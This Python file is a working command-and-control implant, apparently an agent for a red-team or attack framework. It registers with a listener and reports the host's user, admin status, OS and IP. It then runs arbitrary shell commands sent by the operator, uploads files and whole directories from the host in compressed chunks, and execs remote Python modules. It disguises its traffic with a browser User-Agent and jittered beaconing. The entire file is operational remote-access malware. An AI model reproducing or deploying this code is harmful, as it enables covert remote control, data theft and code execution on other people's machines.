import ctypes
import getpass
import json
import locale
import logging
import os
import platform
import random
import socket
import subprocess
import time
import urllib.error
import urllib.request
import uuid
import zlib

REMOTE_HOST = "127.0.0.1"
REMOTE_PORT = 1337
SLEEP_TIME = 1
SLEEP_TIME_JITTER = 0.5
TASKS_URL_PATHS = ["/tasks"]
RESULTS_URL_PATHS = ["/results"]
REGISTRATION_URL_PATHS = ["/register"]
EXTRA_HEADERS = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:146.0)"}
AGENT_TYPE = "eula_multi"


def shell_capability(task_id, arguments, connection):
    command = arguments["command"]
    timeout = arguments["timeout"]
    blind = arguments["blind"]
    shell = arguments["shell"]
    expand = arguments["expand"]

    if shell and not os.path.exists(shell):
        connection.post_results_to_listener(
            task_id=task_id,
            success=False,
            message=(
                f"Failed to execute command '{command}'. The provided shell binary "
                "file path does not exist."
            ),
        )
        return

    if command[:3].lstrip().lower() == "cd ":
        directory_to_change_to = command.replace("cd ", "", 1)
        if expand:
            directory_to_change_to = os.path.expandvars(directory_to_change_to)
        try:
            os.chdir(directory_to_change_to)
        except FileNotFoundError:
            connection.post_results_to_listener(
                task_id=task_id,
                success=False,
                message=(
                    f"Failed to change to directory '{directory_to_change_to}'. "
                    "Directory does not exist."
                ),
            )
            return
        except NotADirectoryError:
            connection.post_results_to_listener(
                task_id=task_id,
                success=False,
                message=(
                    f"Failed to change to directory '{directory_to_change_to}'. Path "
                    "is not a directory."
                ),
            )
            return
        connection.post_results_to_listener(
            task_id=task_id,
            success=True,
            message=f"Changed to directory '{directory_to_change_to}'",
        )
        return

    if platform.system() == "Windows" and shell is None:
        if os.path.exists(
            "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        ):
            shell = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
        else:
            shell = "C:\\Windows\\System32\\cmd.exe"

    if blind:
        subprocess.Popen(
            command,
            shell=True,
            executable=shell,
        )
        output = f"Executed command '{command}' blind."
    else:
        try:
            output = subprocess.run(
                command,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                timeout=timeout,
                executable=shell,
            )
        except subprocess.TimeoutExpired:
            connection.post_results_to_listener(
                task_id=task_id,
                success=False,
                message=(
                    f"Failed to execute command '{command}'. Command timed out "
                    f"after {timeout} second(s)."
                ),
            )
            return

        output = (output.stdout + output.stderr).decode("utf-8", errors="ignore")

    connection.post_results_to_listener(
        task_id=task_id,
        success=True,
        message=output,
    )


def ping_capability(task_id, connection):
    connection.post_results_to_listener(
        task_id=task_id,
        success=True,
    )


def sleep_capability(task_id, arguments, connection):
    duration = arguments["duration"]
    connection.post_results_to_listener(
        task_id=task_id,
        success=True,
        message=f"Agent is sleeping for {duration} seconds...",
    )
    time.sleep(duration)


def disconnect_capability(task_id, arguments, connection):
    duration = arguments["duration"]
    connection.post_results_to_listener(
        task_id=task_id,
        success=True,
        message=(
            f"Agent is disconnecting and waiting {duration} second(s) "
            "before attempting to reconnect..."
        ),
    )
    time.sleep(duration)
    return True  # Signal to disconnect


def kill_capability(task_id, connection):
    connection.post_results_to_listener(
        task_id=task_id,
        success=True,
        message="Agent is killing itself...",
    )
    exit()


def delay_capability(task_id, arguments, connection):
    duration = arguments["duration"]
    jitter = arguments["jitter"]
    connection.post_results_to_listener(
        task_id=task_id,
        success=True,
        message=(
            f"Agent is updating delay to '{duration}' second(s) with a "
            f"jitter of '{jitter}'"
        ),
    )
    connection.sleep_time = duration
    connection.sleep_time_jitter = jitter


def download_capability(task_id, arguments, connection):
    source = arguments["source"]
    recursive = arguments["recursive"]
    chunk_size = arguments["chunk_size"]
    ignore_empty_dirs = arguments["ignore_empty_dirs"]
    compression_level = arguments["compression_level"]
    expand = arguments["expand"]

    if expand:
        source = os.path.expandvars(source)

    if not os.path.exists(source):
        connection.post_results_to_listener(
            task_id=task_id,
            success=False,
            message=f"Failed to start download. Path '{source}' does not exist.",
        )
        return

    def send_file(file_path, relative_path=None):
        display_path = relative_path if relative_path else os.path.basename(file_path)
        try:
            connection.post_results_to_listener(
                task_id=task_id,
                success=True,
                data={
                    "type": "file",
                    "path": display_path,
                    "size": os.path.getsize(file_path),
                },
            )
            with open(file_path, mode="rb") as file:
                while chunk := file.read(chunk_size):
                    if compression_level:
                        chunk = zlib.compress(chunk, level=compression_level)
                    connection.post_results_to_listener(
                        task_id=task_id,
                        success=True,
                        data={
                            "type": "chunk",
                        },
                        payload=chunk,
                    )
            connection.post_results_to_listener(
                task_id=task_id,
                success=True,
                data={
                    "type": "end_of_file",
                },
            )
        except PermissionError:
            connection.post_results_to_listener(
                task_id=task_id,
                success=False,
                message=f"Permission denied reading file '{file_path}'.",
            )

    def send_directory(directory_path):
        connection.post_results_to_listener(
            task_id=task_id,
            success=True,
            data={"type": "directory", "path": os.path.basename(directory_path)},
        )
        base_parent = os.path.dirname(os.path.normpath(directory_path))
        for root, dirs, files in os.walk(directory_path):
            for directory in dirs:
                dir_path = os.path.join(root, directory)
                if ignore_empty_dirs and not os.listdir(dir_path):
                    continue
                connection.post_results_to_listener(
                    task_id=task_id,
                    success=True,
                    data={
                        "type": "directory",
                        # Includes the base dir within the relative path
                        "path": os.path.relpath(dir_path, base_parent),
                    },
                )
            for file in files:
                file_path = os.path.join(root, file)
                relative_path = os.path.relpath(file_path, directory_path)
                send_file(file_path=file_path, relative_path=relative_path)
            if not recursive:
                break

    if os.path.isfile(source):
        send_file(file_path=source)
    else:
        send_directory(directory_path=source)

    connection.post_results_to_listener(
        task_id=task_id,
        success=True,
        data={"type": "end_of_transfer"},
    )


def upload_capability(task_id, arguments, connection):
    destination = arguments["destination"]
    expand = arguments["expand"]
    overwrite = arguments["overwrite"]

    if expand:
        destination = os.path.expandvars(destination)

    if os.path.exists(destination) and not overwrite:
        connection.post_results_to_listener(
            task_id=task_id,
            success=False,
            message=f"Failed to start upload. Path '{destination}' already exists.",
        )
        return

    connection.post_results_to_listener(
        task_id=task_id,
        success=True,
        message=f"Uploaded to path '{destination}'.",
    )


class ModuleLoader:
    def __init__(self):
        self._loaded_modules = {}

    def load_module(self, module_name, module_source_code):
        if module_name in self._loaded_modules:
            return {
                "success": False,
                "message": (
                    f"Failed to load module. Module '{module_name}' is already loaded."
                ),
                "data": {},
            }

        try:
            module_namespace = {}
            exec(module_source_code, module_namespace)
        except Exception as exc:
            return {
                "success": False,
                "message": f"Failed to load module. {exc}",
                "data": {},
            }

        try:
            self._loaded_modules[module_name] = module_namespace["Module"]()
        except KeyError:
            return {
                "success": False,
                "message": "Failed to load module. Module class not found in module",
                "data": {},
            }

        return {
            "success": True,
            "message": f"Loaded module '{module_name}'.",
            "data": {},
        }

    def unload_module(self, module_name: str):
        if module_name in self._loaded_modules:
            del self._loaded_modules[module_name]
            return {
                "success": True,
                "message": f"Unloaded module '{module_name}'.",
                "data": {},
            }
        else:
            return {
                "success": False,
                "message": (
                    f"Failed to unload module. Module '{module_name}' is not currently "
                    "loaded."
                ),
                "data": {},
            }

    def reload_module(self, module_name, module_source_code):
        if module_name not in self._loaded_modules:
            return {
                "success": False,
                "message": (
                    f"Failed to reload module. Module '{module_name}' is not currently "
                    "loaded."
                ),
                "data": {},
            }

        try:
            module_namespace = {}
            exec(module_source_code, module_namespace)
        except Exception as exc:
            return {
                "success": False,
                "message": f"Failed to reload module. {exc}",
                "data": {},
            }

        try:
            self._loaded_modules[module_name] = module_namespace["Module"]()
        except KeyError:
            return {
                "success": False,
                "message": "Failed to reload module. Module class not found in module",
                "data": {},
            }

        return {
            "success": True,
            "message": f"Reloaded module '{module_name}'.",
            "data": {},
        }

    def run_module(self, module_name, arguments, connection):
        self._loaded_modules[module_name].run_module(
            arguments=arguments, connection=connection
        )

    def get_loaded_module_names(self):
        return list(self._loaded_modules.keys())


class Connection:
    def __init__(
        self,
        remote_host,
        remote_port,
        sleep_time,
        sleep_time_jitter,
        tasks_url_paths,
        results_url_paths,
        registration_url_paths,
    ):
        self.remote_host = remote_host
        self.remote_port = remote_port
        self.sleep_time = sleep_time
        self.sleep_time_jitter = sleep_time_jitter
        self.tasks_url_paths = tasks_url_paths
        self.results_url_paths = results_url_paths
        self.registration_url_paths = registration_url_paths

        self._listener_base_url = f"http://{self.remote_host}:{self.remote_port}"
        self._agent_id = None

    def register_with_listener(self, agent_data):
        register_request = urllib.request.Request(
            f"{self._listener_base_url}{random.choice(self.registration_url_paths)}",
            data=json.dumps(agent_data).encode(),
            method="POST",
            headers=EXTRA_HEADERS,
        )
        agent_id_response = urllib.request.urlopen(register_request)
        agent_id = json.loads(agent_id_response.read().decode())["agent_id"]
        self._agent_id = agent_id
        return agent_id

    def get_tasks_from_listener(self):
        if self._agent_id is None:
            raise RuntimeError("Agent not registered with listener")

        tasks_request = urllib.request.Request(
            f"{self._listener_base_url}{random.choice(self.tasks_url_paths)}",
            headers={"Cookie": self._agent_id, **EXTRA_HEADERS},
        )
        tasks_response = urllib.request.urlopen(tasks_request)
        tasks = json.loads(tasks_response.read().decode())
        return tasks

    def post_results_to_listener(
        self, task_id, success, message="", data=None, payload=None
    ):
        if data is None:
            data = {}
        if self._agent_id is None:
            raise RuntimeError("Agent not registered with listener")
        if payload is not None:
            # Generate a unique boundary
            boundary = str(uuid.uuid4())

            # Define the Content-Type header
            headers = {
                **EXTRA_HEADERS,
                "Cookie": self._agent_id,
                "Content-Type": f"multipart/form-data; boundary={boundary}",
            }

            # Construct the body as bytes
            body = []

            # JSON Metadata
            body.append(f"--{boundary}".encode())
            body.append(b'Content-Disposition: form-data; name="json"')
            body.append(b"Content-Type: application/json")
            body.append(b"")  # Blank line before data
            body.append(
                json.dumps(
                    {
                        "task_id": task_id,
                        "success": success,
                        "message": message,
                        "data": data,
                    }
                ).encode("utf-8")
            )

            # Binary Data
            body.append(f"--{boundary}".encode())
            body.append(b'Content-Disposition: form-data; name="payload"')
            body.append(b"Content-Type: application/octet-stream")
            body.append(b"")  # Blank line before data
            body.append(payload)

            # Close the request
            body.append(f"--{boundary}--".encode())
            body.append(b"")

            # Join all parts with CRLF
            data = b"\r\n".join(body)
        else:
            data = json.dumps(
                {
                    "task_id": task_id,
                    "success": success,
                    "message": message,
                    "data": data,
                },
            ).encode()
            headers = {
                **EXTRA_HEADERS,
                "Cookie": self._agent_id,
                "Content-Type": "application/json",
            }

        urllib.request.urlopen(
            urllib.request.Request(
                f"{self._listener_base_url}{random.choice(self.results_url_paths)}",
                data=data,
                headers=headers,
                method="POST",
            )
        )

    def get_upload_chunk_from_listener(self, task_id):
        if self._agent_id is None:
            raise RuntimeError("Agent not registered with listener")

        upload_chunk_request = urllib.request.Request(
            f"{self._listener_base_url}{random.choice(self.results_url_paths)}",
            data=json.dumps(
                {"task_id": task_id, "type": "upload_chunk_request"}
            ).encode(),
            method="POST",
            headers={"Cookie": self._agent_id, **EXTRA_HEADERS},
        )
        try:
            response = urllib.request.urlopen(upload_chunk_request)
            return json.loads(response.read().decode())
        except Exception:
            return None


class Agent:
    def __init__(
        self,
        connection,
        module_loader,
    ):
        self.connection = connection
        self.module_loader = module_loader

    def _sleep(self):
        jitter_range = self.connection.sleep_time * self.connection.sleep_time_jitter
        random_jitter = random.uniform(-jitter_range, jitter_range)
        time_to_sleep = self.connection.sleep_time + random_jitter
        if time_to_sleep < 0:
            time_to_sleep = 0
        time.sleep(time_to_sleep)

    def run_agent(self):
        def get_is_admin():
            try:
                return os.getuid() == 0
            except AttributeError:
                try:
                    return ctypes.windll.shell32.IsUserAnAdmin() != 0
                except Exception:
                    return False

        def get_local_host_address():
            test_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            test_socket.settimeout(0)
            try:
                test_socket.connect(("10.254.254.254", 1))
                local_host_address = test_socket.getsockname()[0]
            except Exception:
                local_host_address = "127.0.0.1"
            finally:
                test_socket.close()
            return local_host_address

        def get_user():
            try:
                return getpass.getuser()
            except Exception:
                return None

        agent_data_querying_functions = {
            "agent_type": lambda: AGENT_TYPE,
            "user": get_user,
            "is_admin": get_is_admin,
            "os": lambda: platform.system() + " " + platform.release(),
            "version": platform.version,
            "arch": platform.machine,
            "pid": os.getpid,
            "locale": lambda: " ".join(str(x) for x in locale.getlocale()),
            "local_host_address": get_local_host_address,
            "hostname": platform.node,
        }
        agent_data = {}
        for data_name, data_function in agent_data_querying_functions.items():
            try:
                agent_data[data_name] = data_function()
            except Exception as exc:
                logging.error(exc, exc_info=exc)  # TODO: Remove after testing

        while True:
            try:
                while True:
                    try:
                        self.connection.register_with_listener(agent_data=agent_data)
                        break
                    except urllib.error.URLError:
                        self._sleep()

                while True:
                    tasks = self.connection.get_tasks_from_listener()
                    logging.debug(tasks)
                    disconnect = False
                    for task in tasks:
                        task_id = task["task_id"]
                        command = task["command"]
                        arguments = task["arguments"]

                        if command == "shell":
                            shell_capability(
                                task_id=task_id,
                                arguments=arguments,
                                connection=self.connection,
                            )
                        elif command == "ping":
                            ping_capability(task_id=task_id, connection=self.connection)
                        elif command == "sleep":
                            sleep_capability(
                                task_id=task_id,
                                arguments=arguments,
                                connection=self.connection,
                            )
                        elif command == "disconnect":
                            disconnect = disconnect_capability(
                                task_id=task_id,
                                arguments=arguments,
                                connection=self.connection,
                            )
                            if disconnect:
                                break
                        elif command == "kill":
                            kill_capability(task_id=task_id, connection=self.connection)
                        elif command == "delay":
                            delay_capability(
                                task_id=task_id,
                                arguments=arguments,
                                connection=self.connection,
                            )
                        elif command == "download":
                            download_capability(
                                task_id=task_id,
                                arguments=arguments,
                                connection=self.connection,
                            )
                        elif command == "upload":
                            upload_capability(
                                task_id=task_id,
                                arguments=arguments,
                                connection=self.connection,
                            )
                        else:
                            module_name = command
                            try:
                                self.module_loader.run_module(
                                    module_name=module_name,
                                    arguments=arguments,
                                    connection=self.connection,
                                )
                            except urllib.error.URLError:
                                raise
                            except Exception as exc:
                                logging.error(
                                    exc, exc_info=exc
                                )  # TODO: Remove after testing
                                self.connection.post_results_to_listener(
                                    task_id=task_id,
                                    success=False,
                                    message=(
                                        f"Failed to run module '{module_name}'. "
                                        f"{exc.__class__.__name__}: {exc}"
                                    ),
                                    data={
                                        "type": exc.__class__.__name__,
                                        "message": str(exc),
                                    },
                                )
                    if disconnect:
                        break
                    self._sleep()
            except Exception as exc:
                logging.error(exc, exc_info=exc)  # TODO: Remove after testing
                self._sleep()


def main():
    logging.getLogger().setLevel(logging.DEBUG)
    connection = Connection(
        remote_host=REMOTE_HOST,
        remote_port=REMOTE_PORT,
        sleep_time=SLEEP_TIME,
        sleep_time_jitter=SLEEP_TIME_JITTER,
        tasks_url_paths=TASKS_URL_PATHS,
        results_url_paths=RESULTS_URL_PATHS,
        registration_url_paths=REGISTRATION_URL_PATHS,
    )
    module_loader = ModuleLoader()
    agent = Agent(connection=connection, module_loader=module_loader)
    agent.run_agent()


if __name__ == "__main__":
    main()
